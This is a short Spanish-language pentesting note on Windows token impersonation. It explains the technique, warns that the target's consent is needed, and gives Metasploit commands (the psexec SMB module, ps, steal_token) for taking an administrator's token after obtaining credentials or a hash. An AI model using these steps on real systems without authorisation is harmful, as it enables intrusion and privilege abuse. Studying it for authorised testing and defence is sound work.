
# Token Impersonation

En un ataque de token impersonation, un atacante utiliza distintas herramientas para extraer el token de acceso de un usuario con permisos elevados en Windows. Una vez que el atacante tiene acceso al token de acceso, puede utilizar herramientas como Invoke-TokenManipulation para suplantar el token de acceso del usuario con permisos elevados y obtener acceso no autorizado a los recursos del sistema y aplicaciones que el usuario con permisos elevados estaría autorizado a utilizar.

{% hint style="warning" %}
Necesitamos saber las credenciales o un hash de un empleado
{% endhint %}

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Con Metasploit</mark>

* Meter Kali en la misma red que el DC

```
msfconsole
use exploit/windows/smb/psexec
exploit
```

{% hint style="success" %}
Esto nos abre una sesión de Meterpreter
{% endhint %}

```csharp
ps 
# nos muestra todos los procesos abiertos
# Ver el proceso que está siendo ejecutado por un administrador
```

<figure><img src="/files/NI9Im6ObDcd96DIt7bId" alt=""><figcaption><p>Proceso ejecutándose por un administrador</p></figcaption></figure>

```
steal_token 7924
```

{% hint style="success" %}
Ya tendríamos cargado el token de Administrador con permisos máximos y podríamos ejecutar acciones en su nombre
{% endhint %}
